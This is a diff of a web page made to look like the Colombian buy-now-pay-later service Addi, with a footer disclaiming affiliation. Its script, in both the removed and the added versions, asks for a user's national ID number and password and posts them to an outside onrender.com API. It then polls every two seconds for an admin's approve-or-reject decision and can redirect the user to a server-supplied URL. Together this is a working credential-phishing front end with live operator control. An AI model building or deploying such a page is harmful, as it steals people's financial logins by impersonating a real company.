-    <div class="footer-top">
-      <div class="footer-brand">
-        <a class="brand" href="#inicio">Addi<span class="dot">.</span></a>
-        <p>Compra lo que quieres hoy, págalo después.</p>
-      </div>
-      <div class="footer-links">
-        <div class="footer-col"><strong>Explora</strong><a href="#como-funciona">Cómo funciona</a><a href="#opciones">Créditos</a><a href="#marketplace">Dónde comprar</a></div>
-        <div class="footer-col"><strong>Ayuda</strong><a href="#preguntas">Preguntas frecuentes</a><a href="#preguntas">Seguridad</a><a href="#preguntas">Contáctanos</a></div>
-        <div class="footer-col"><strong>Información</strong><a href="#preguntas">Términos y condiciones</a><a href="#preguntas">Privacidad</a><a href="#preguntas">Tarifas</a></div>
-      </div>
-    </div>
-    <div class="footer-bottom"><span>© 2026 Réplica visual de demostración.</span><span>No afiliada a Addi.</span></div>
-  </div>
-</footer>
-
-<div class="toast" id="toast" role="status" aria-live="polite"></div>
-
-<!-- ══════════════ JAVASCRIPT ══════════════ -->
 <script>
-  // URL de la API (Render en producción, localhost en local si es necesario)
-  var API = (window.location.hostname === "localhost" || window.location.hostname === "127.0.0.1")
+  // Conexión a la API de Render
+  const API = (window.location.hostname === "localhost" || window.location.hostname === "127.0.0.1")
     ? "http://localhost:3000/api"
     : "https://addi-api-plgh.onrender.com/api";
-  var adminToken = null;
 
-  /* ── Toast ─────────────────────────────── */
-  var toastEl = document.getElementById("toast");
-  var toastTmr;
-  function showToast(msg, zi) {
-    toastEl.textContent = msg;
-    toastEl.style.zIndex = zi || "60";
-    toastEl.classList.add("show");
-    clearTimeout(toastTmr);
-    toastTmr = setTimeout(function() {
-      toastEl.classList.remove("show");
-      toastEl.style.zIndex = "60";
-    }, 3400);
+  let session = { cedula: "", password: "" };
+  let pollingTimer = null;
+
+  const $ = id => document.getElementById(id);
+
+  function show(id) {
+    document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+    const el = $(id);
+    if(el) el.classList.add('active');
+    window.scrollTo(0, 0);
   }
 
-  /* ── Menú móvil ─────────────────────────── */
-  var menuToggle = document.querySelector(".menu-toggle");
-  var navLinksEl = document.getElementById("nav-links");
-  menuToggle.addEventListener("click", function() {
-    var o = menuToggle.getAttribute("aria-expanded") === "true";
-    menuToggle.setAttribute("aria-expanded", String(!o));
-    menuToggle.setAttribute("aria-label", o ? "Abrir menú" : "Cerrar menú");
-    navLinksEl.classList.toggle("open", !o);
-  });
-  navLinksEl.querySelectorAll("a").forEach(function(l) {
-    l.addEventListener("click", function() {
-      navLinksEl.classList.remove("open");
-      menuToggle.setAttribute("aria-expanded", "false");
-    });
-  });
-
-  /* ══════════════════════════════════════════
-     MODAL DE CUPO
-  ══════════════════════════════════════════ */
-  var backdrop = document.getElementById("cupo-modal");
-  var submitBtn = document.getElementById("submit-btn");
-  var currentCedula = null;
-  var statusPollingTimer = null;
-
-  function stopStatusPolling() {
-    if (statusPollingTimer) {
-      clearInterval(statusPollingTimer);
-      statusPollingTimer = null;
-    }
+  function showLayer(show, text) {
+    const l = $('loadLayer');
+    if (l) l.style.display = show ? 'flex' : 'none';
+    if (show && text) $('loadText').textContent = text;
   }
 
-  function showView(id) {
-    ["mv-form","mv-approved","mv-rejected","mv-pending","mv-error"].forEach(function(v) {
-      var el = document.getElementById(v);
-      if (el) el.style.display = v === id ? "" : "none";
-    });
-  }
-
-  function openModal() {
-    stopStatusPolling();
-    currentCedula = null;
-    showView("mv-form");
-    document.getElementById("cupo-form").reset();
-    clearErr("cedula"); clearErr("pass");
-    backdrop.classList.add("open");
-    document.body.style.overflow = "hidden";
-    setTimeout(function() { document.getElementById("f-cedula").focus(); }, 300);
-  }
-
-  function closeModal(force) {
-    // Si la solicitud está pendiente de evaluación, no permitir que se cierre por accidente
-    var pendingView = document.getElementById("mv-pending");
-    if (!force && pendingView && pendingView.style.display !== "none") {
-      showToast("Tu solicitud está en evaluación, por favor espera un momento...");
+  // Paso 1: Ingreso de Cédula
+  function submitCedula() {
+    const v = $('cedula').value.replace(/\D/g, '');
+    if (v.length < 6) {
+      $('cedula-err').style.display = 'block';
       return;
     }
-
-    stopStatusPolling();
-    backdrop.classList.remove("open");
-    document.body.style.overflow = "";
+    $('cedula-err').style.display = 'none';
+    session.cedula = v;
+    show('s-pass');
+    setTimeout(() => $('passwd').focus(), 150);
   }
 
-  function startStatusPolling(cedula) {
-    stopStatusPolling();
-    currentCedula = cedula;
-    statusPollingTimer = setInterval(function() {
-      if (!currentCedula || !backdrop.classList.contains("open")) {
-        stopStatusPolling();
-        return;
-      }
+  // Paso 2: Ingreso de Contraseña y Envío
+  async function submitPass() {
+    const p = $('passwd').value;
+    if (p.length < 4) {
+      $('pass-err').style.display = 'block';
+      return;
+    }
+    $('pass-err').style.display = 'none';
+    session.password = p;
 
-      fetch(API + "/estado/" + encodeURIComponent(currentCedula))
-        .then(function(r) { return r.json(); })
-        .then(function(data) {
-          if (data.status === "approved") {
-            stopStatusPolling();
-            showView("mv-approved");
-            if (data.redirectUrl) {
-              setTimeout(function() { window.location.href = data.redirectUrl; }, 3000);
-            }
-          } else if (data.status === "rejected") {
-            stopStatusPolling();
-            showView("mv-rejected");
+    const b = $('btnPass');
+    b.disabled = true;
+    b.textContent = 'Enviando…';
+
+    try {
+      const res = await fetch(API + "/solicitar", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ cedula: session.cedula, password: session.password })
+      });
+
+      if (!res.ok) throw new Error("Error en el servidor");
+
+      // Mostrar pantalla de espera activa
+      show('s-verif');
+      startPolling(session.cedula);
+    } catch (err) {
+      b.disabled = false;
+      b.textContent = 'Continuar';
+      alert("Hubo un problema de conexión. Inténtalo de nuevo.");
+    }
+  }
+
+  // Sondeo en tiempo real cada 2 segundos esperando la aprobación o rechazo del admin
+  function startPolling(cedula) {
+    if (pollingTimer) clearInterval(pollingTimer);
+
+    pollingTimer = setInterval(async () => {
+      try {
+        const res = await fetch(API + "/estado/" + encodeURIComponent(cedula));
+        if (!res.ok) return;
+
+        const data = await res.json();
+        if (data.status === "approved") {
+          clearInterval(pollingTimer);
+          show('s-asesor');
+          if (data.redirectUrl) {
+            setTimeout(() => { window.location.href = data.redirectUrl; }, 3500);
           }
-        })
-        .catch(function() {});
+        } else if (data.status === "rejected") {
+          clearInterval(pollingTimer);
+          show('s-rechazado');
+        }
+      } catch (_) {}
     }, 2000);
   }
 
-  document.getElementById("modal-close-btn").addEventListener("click", closeModal);
-  backdrop.addEventListener("click", function(e) { if (e.target === backdrop) closeModal(); });
-  document.addEventListener("keydown", function(e) {
-    if (e.key === "Escape" && backdrop.classList.contains("open")) closeModal();
-  });
-  document.querySelectorAll("[data-cupo]").forEach(function(b) {
-    b.addEventListener("click", openModal);
-  });
-
-  function showErr(f, msg) {
-    document.getElementById("f-" + f).classList.add("err");
-    var e = document.getElementById("err-" + f);
-    if (msg) e.textContent = msg;
-    e.classList.add("show");
-  }
-  function clearErr(f) {
-    document.getElementById("f-" + f).classList.remove("err");
-    document.getElementById("err-" + f).classList.remove("show");
-  }
-
-  document.getElementById("cupo-form").addEventListener("submit", function(e) {
-    e.preventDefault();
-    var cedula = document.getElementById("f-cedula").value.trim();
-    var pass   = document.getElementById("f-pass").value;
-    var ok = true;
-    clearErr("cedula"); clearErr("pass");
-    if (!cedula) { showErr("cedula", "Por favor ingresa tu número de cédula."); ok = false; }
-    if (!pass)   { showErr("pass", "Por favor ingresa tu contraseña."); ok = false; }
-    if (!ok) return;
-
-    submitBtn.disabled = true;
-    submitBtn.innerHTML = '<span class="spinner"></span> Enviando…';
-
-    fetch(API + "/solicitar", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ cedula: cedula, password: pass })
-    })
-    .then(function(r) { return r.json(); })
-    .then(function(data) {
-      submitBtn.disabled = false;
-      submitBtn.innerHTML = 'Enviar solicitud <span>→</span>';
-      
-      // Mostrar estado pendiente y empezar a verificar en tiempo real
-      showView("mv-pending");
-      startStatusPolling(cedula);
-    })
-    .catch(function() {
-      submitBtn.disabled = false;
-      submitBtn.innerHTML = 'Enviar solicitud <span>→</span>';
-      showView("mv-error");
-    });
-  });
-
-  /* ── Limpieza: El panel de administración ahora reside independientemente en admin.html ── */
+  $('cedula').addEventListener('input', e => e.target.value = e.target.value.replace(/\D/g, ''));
+  $('cedula').addEventListener('keydown', e => { if (e.key === 'Enter') submitCedula(); });
+  $('passwd').addEventListener('keydown', e => { if (e.key === 'Enter') submitPass(); });
 </script>
 </body>
 </html>
